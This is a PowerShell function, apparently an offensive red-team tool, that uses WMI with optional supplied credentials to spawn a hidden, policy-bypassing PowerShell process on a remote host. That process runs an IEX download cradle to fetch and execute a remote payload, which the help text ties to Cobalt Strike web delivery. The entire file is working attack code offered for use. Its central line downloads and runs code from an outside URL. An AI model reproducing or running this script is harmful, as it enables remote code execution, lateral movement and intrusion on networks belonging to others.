function Invoke-WmicPSDL{


  <#
  .SYNOPSIS
  This script uses wmic to open a powershell process and use the IEX download cradle to execute a powershell web drive by payload.

  .DESCRIPTION 
  This function calls wmic process call create to execute the powershell command for the IEX download cradle. The cradle is used to execute a payload delivered via
  the powershell web drive by exploitation module in cobaltstrike. Wmic runs with the permissions of the current user by default.

  .EXAMPLE
  > Invoke-WmicPSDL http://127.0.0.1/update -UserPass "test\jonny Kg^*dksLkD$" -TARGET 192.168.1.10
  Run the script with user credentials for a specific host

  .EXAMPLE
  > Invoke-WmicPSDL http://192.168.1.101/a 
  Run the script against the localhost with the current user credentials

  .PARAMETER UserPass
  Specify a username and password, seperated by a space and enclosed in quotes. Default is the current user context. 

  .PARAMETER URL
  URL for the powershell web delivery. Required. 

  .PARAMETER TARGET
  Host to target. Can be a hostname, IP address, or FQDN. Default is set to localhost. 

  #>

  param(
    #Parameter assignment
    [Parameter(Mandatory = $True, Position = 0)] [string]$URL,

    [string]$UserPass,

    [string]$TARGET = "."

  )

  if($UserPass ){
    #Assign username and password if parameter is set. Run the wmic method with the specified credentials.
    $Creds = $UserPass.split("")
    $Username = $Creds[0]
    $password = convertto-securestring $Creds[1] -asplaintext -force
    $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username,$password
    $cmd = "powershell.exe -exec bypass -w hidden IEX (New-object Net.webclient).Downloadstring('$URL')"
    Invoke-WmiMethod -class Win32_process -name Create -Argumentlist $cmd -Credential $cred -ComputerName $TARGET 
  }
  else{
    $cmd = "powershell.exe -exec bypass -w hidden IEX (New-object Net.webclient).Downloadstring('$URL')"
    Invoke-WmiMethod -class Win32_process -name Create -Argumentlist $cmd -ComputerName $TARGET
  }





  




}